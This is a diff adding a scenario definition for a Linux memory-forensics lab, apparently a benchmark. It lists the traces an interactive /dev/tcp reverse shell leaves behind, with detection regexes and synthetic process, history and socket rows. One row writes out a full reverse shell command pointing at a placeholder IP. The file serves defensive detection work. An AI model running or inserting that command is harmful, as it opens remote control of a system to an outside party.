@@ -1,0 +1,51 @@
+id = "L03"
+name = "Interactive reverse shell via /dev/tcp"
+technique = "T1059.004"
+tactic = "execution"
+platform = "linux"
+environment = "cloud-vm"
+timepoints = [0, 5, 15, 60]
+notes = """
+Cloud Linux VM with a lab listener on an isolated subnet / security group.
+Compare how long the shell process, its socket and its history survive,
+including after the session is closed.
+"""
+
+[[artefact]]
+id = "devtcp_history"
+category = "execution"
+weight = 3
+plugin = "linux.bash.Bash"
+description = "Shell history showing a /dev/tcp redirection."
+[artefact.match]
+Command = '/dev/tcp/\d+\.\d+\.\d+\.\d+/\d+'
+[artefact.synthetic]
+p = [0.95, 0.9, 0.8, 0.6]
+row = { PID = 2500, Process = "bash", Command = "bash -i >& /dev/tcp/192.0.2.10/4444 0>&1" }
+
+[[artefact]]
+id = "interactive_shell_argv"
+category = "execution"
+weight = 2
+plugin = "linux.psaux.PsAux"
+[artefact.match]
+ARGS = '^(/bin/)?(ba)?sh\s+-i\b'
+[artefact.synthetic]
+p = [1.0, 0.8, 0.5, 0.2]
+row = { PID = 2501, PPID = 2500, COMM = "bash", ARGS = "bash -i" }
+
+[[artefact]]
+id = "shell_established_socket"
+category = "network"
+weight = 3
+plugin = "linux.sockstat.Sockstat"
+[artefact.match]
+"Process Name" = '^(ba)?sh$'
+State = 'ESTABLISHED'
+[artefact.partial]
+"Process Name" = '^(ba)?sh$'
+State = 'CLOSE_WAIT|FIN_WAIT|TIME_WAIT'
+[artefact.synthetic]
+p = [1.0, 0.7, 0.3, 0.05]
+row = { PID = 2501, "Process Name" = "bash", Proto = "TCP", "Destination Addr" = "192.0.2.10", "Destination Port" = "4444", State = "ESTABLISHED" }
+partial_row = { PID = 2501, "Process Name" = "bash", Proto = "TCP", "Destination Addr" = "192.0.2.10", "Destination Port" = "4444", State = "CLOSE_WAIT" }
